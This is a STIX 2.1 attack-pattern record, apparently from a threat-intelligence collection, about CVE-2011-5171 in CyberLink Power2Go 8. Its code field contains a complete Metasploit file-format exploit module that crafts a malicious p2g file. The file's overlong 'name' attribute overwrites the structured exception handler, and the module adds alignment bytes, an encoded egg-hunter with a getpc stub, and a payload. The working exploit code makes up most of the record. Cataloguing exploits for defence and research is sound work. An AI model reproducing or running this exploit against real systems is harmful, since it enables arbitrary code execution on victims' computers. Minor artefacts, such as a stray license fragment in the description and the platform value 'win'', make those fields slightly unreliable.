{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--12f70d41-44fd-4b54-8ed1-3aea1815388f",
    "created": "2024-08-14T16:37:56.271223Z",
    "modified": "2024-08-14T16:37:56.271226Z",
    "name": "CyberLink Power2Go name Attribute (p2g) Stack Buffer Overflow Exploit",
    "description": " This module exploits a stack buffer overflow in CyberLink Power2Go version 8.x The vulnerability is triggered when opening a malformed p2g file containing an overly long string in the 'name' attribute of the file element. This results in overwriting a structured exception handler record.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/cyberlink_p2g_bof.rb",
            "external_id": "cyberlink_p2g_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5171"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'CyberLink Power2Go name Attribute (p2g) Stack Buffer Overflow Exploit',\n      'Description'     => %q{\n          This module exploits a stack buffer overflow in CyberLink Power2Go version 8.x\n        The vulnerability is triggered when opening a malformed p2g file containing an overly\n        long string in the 'name' attribute of the file element. This results in overwriting a\n        structured exception handler record.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'modpr0be <modpr0be[at]spentera.com>',    # initial discovery\n          'mr_me <steventhomasseeley[at]gmail.com>' # msf module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2011-5171'],\n          ['BID', '50997'],\n          ['OSVDB', '77600'],\n          ['EDB', '18220'],\n          ['US-CERT-VU', '158003']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'         =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'        => 'win',\n      'Targets'         =>\n        [\n          # Power2Go8.exe (0x004b0028) - pop esi/pop ebp/pop ebx/add esp,10/retn\n          [ 'CyberLink Power2Go 8 (XP/Vista/win7) Universal', { 'Ret' => \"\\x28\\x4b\" } ]\n        ],\n      'DisclosureDate'  => '2011-09-12',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The output filename.', 'msf.p2g'])\n      ])\n  end\n\n  def get_payload(hunter)\n\n    [ 'x86/alpha_mixed', 'x86/unicode_mixed' ].each { |name|\n      enc = framework.encoders.create(name)\n      if name =~ /unicode/\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EAX' })\n      else\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDX' })\n      end\n      # NOTE: we already eliminated badchars\n      hunter = enc.encode(hunter, nil, nil, platform)\n      if name =~/alpha/\n        #insert getpc_stub & align EDX, unicode encoder friendly.\n        #Hardcoded stub is not an issue here because it gets encoded anyway\n        getpc_stub = \"\\x89\\xe1\\xdb\\xcc\\xd9\\x71\\xf4\\x5a\\x83\\xc2\\x41\\x83\\xea\\x35\"\n        hunter = getpc_stub + hunter\n      end\n    }\n\n    return hunter\n  end\n\n  def exploit\n\n    title = rand_text_alpha(10)\n    buffer =  \"\"\n    buffer << rand_text_alpha(778)\n    buffer << \"\\x58\\x28\"        # nseh\n    buffer << target['Ret']     # seh\n    buffer << \"\\x5f\\x73\" * 15   # pop edi/add [ebx],dh (after byte alignment)\n    buffer << \"\\x58\\x73\"        # pop eax/add [ebx],dh (after byte alignment)\n    buffer << \"\\x40\\x73\" * 3    # inc eax/add [ebx],dh (after byte alignment)\n    buffer << \"\\x40\"            # inc eax\n    buffer << \"\\x73\\x42\" * 337  # add [ebx],dh/pop edx (after byte alignment)\n    buffer << \"\\x73\"            # add [ebx],dh (after byte alignment)\n    buffer << get_payload(payload.encoded)\n\n    p2g_data = <<-EOS\n    <Project magic=\"#{title}\" version=\"101\">\n    <Information />\n      <Compilation>\n        <DataDisc>\n          <File name=\"#{buffer}\" />\n        </DataDisc>\n      </Compilation>\n    </Project>\n    EOS\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(p2g_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-12",
    "x_mitre_platforms": [
        "win'"
    ]
}